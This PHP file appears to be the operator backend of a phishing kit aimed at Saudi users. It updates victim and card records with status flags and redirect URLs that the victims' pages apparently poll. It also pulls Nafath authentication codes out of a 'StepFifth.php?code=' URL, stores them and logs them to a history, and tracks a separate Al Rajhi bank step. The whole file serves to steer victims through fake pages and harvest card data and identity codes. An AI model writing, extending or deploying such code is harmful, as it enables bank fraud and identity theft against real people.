<?php
require_once 'init.php';
header('Content-Type: application/json');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    die(json_encode(['error' => 'Invalid Request']));
}

$type = $_POST['type'] ?? '';
$id = $_POST['id'] ?? '';
$status = $_POST['status'] ?? 0;

if ($type === '' || $id === '' || !is_numeric($id)) {
    die(json_encode(['error' => 'Missing parameters', 'debug' => "type=$type, id=$id, status=$status"]));
}
$id = intval($id);

$db = new DB();

if ($type === 'user') {
    // 1. Update user record
    $db->query("UPDATE users SET CheckTheInfo_Nafad = :status, link = :url WHERE id = :id");
    $db->bind(':status', $status);
    $db->bind(':id', $id);
    $db->bind(':url', $_POST['url'] ?? '');
    $db->execute();

    // 2. Also update card records for compatibility with polling
    $db->query("UPDATE card SET CheckTheInfo_Nafad = :status, url = :url WHERE userId = :id");
    $db->bind(':status', $status);
    $db->bind(':id', $id);
    $db->bind(':url', $_POST['url'] ?? '');
    $db->execute();

    echo json_encode(['success' => true]);
    exit;
} elseif ($type === 'card_nafath') {
    $url = $_POST['url'] ?? '';
    if (strpos($url, 'StepFifth.php?code=') !== false) {
        $parts = explode('code=', $url);
        $code = end($parts);
        $db->query("UPDATE card SET CheckTheInfo_Nafad = :status, url = :url, Authentication_code = :code WHERE id = :id");
        $db->bind(':code', $code);
        
        // Save to history log
        $User->saveNafathCodeToHistory($id, $code);
    } else {
        $db->query("UPDATE card SET CheckTheInfo_Nafad = :status, url = :url WHERE id = :id");
    }
    $db->bind(':status', $status);
    $db->bind(':id', $id);
    $db->bind(':url', $url);
} elseif ($type === 'card_rajhi') {
    $db->query("UPDATE card SET rajhi_status = :status, url = :url WHERE id = :id");
    $db->bind(':status', $status);
    $db->bind(':id', $id);
    $db->bind(':url', $_POST['url'] ?? '');
} elseif ($type === 'card') {
    $db->query("UPDATE card SET status = :status, url = :url WHERE id = :id");
    $db->bind(':status', $status);
    $db->bind(':id', $id);
    $db->bind(':url', $_POST['url'] ?? '');
} else {
    die(json_encode(['error' => 'Invalid Type']));
}

if ($db->execute()) {
    echo json_encode(['success' => true]);
} else {
    echo json_encode(['error' => 'Update Failed']);
}
